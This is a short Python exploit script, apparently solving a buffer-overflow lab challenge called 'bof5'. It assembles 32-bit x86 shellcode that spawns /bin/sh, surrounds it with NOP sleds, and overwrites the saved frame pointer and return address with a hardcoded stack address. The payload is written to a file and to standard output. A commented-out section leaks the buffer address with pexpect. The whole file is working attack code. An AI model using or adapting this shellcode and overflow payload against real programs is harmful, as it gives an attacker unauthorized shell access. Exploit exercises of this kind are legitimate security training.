#!/usr/bin/python3
import sys
import pexpect

buff_len=0x68

NOP = b'\x90'
XOR_EAX_EAX= b'\x31\xc0'
XOR_EDX_EDX = b"\x31\xd2" # 2b
PUSH_EAX = b"\x50" #1b
PUSH_ARG_1 = b"\x68\x2f\x2f\x73\x68" #5b
PUSH_ARG_2 = b"\x68\x2f\x62\x69\x6e" #5b
MOV_EBX_ESP = b"\x89\xe3" #2b
MOV_AL_0B = b"\xb0\x0b" #2b
INT_80H = b"\xcd\x80" #2b

SHELLCODE = XOR_EAX_EAX+\
	XOR_EDX_EDX+\
	PUSH_EAX+\
	PUSH_ARG_1+\
	PUSH_ARG_2+\
	MOV_EBX_ESP+\
	MOV_AL_0B+\
	INT_80H+\
	NOP


"""
io = pexpect.spawn('./bof5 $(./solve.py)')
io.expect('buffer @ 0x')
addr2 = io.readline().decode().strip()
io.close()

with open("addr.txt","w") as f:
	f.write(addr2)
"""
addr = b'\xb0\xd3\xff\xff'
buffer =NOP*((buff_len-len(SHELLCODE))//2)+\
	SHELLCODE+\
	NOP*((buff_len-len(SHELLCODE))//2)+\
	b'_EBP'+\
	addr

with open('input.txt','wb') as f:
	f.write(buffer)

sys.stdout.buffer.write(buffer)

